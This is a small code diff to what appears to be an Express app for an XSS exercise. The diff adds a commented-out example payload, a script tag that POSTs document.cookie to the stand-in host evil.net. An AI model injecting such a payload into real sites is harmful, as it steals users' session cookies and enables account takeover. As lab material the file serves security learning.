@@ -1,4 +1,8 @@
 // XSS
+
+// Payload
+// <script>fetch('https://evil.net', {method: 'POST',mode: 'no-cors',body:document.cookie});</script>
+
 const bodyParser = require("body-parser");
 const cookieParser = require("cookie-parser");
 const express = require("express");
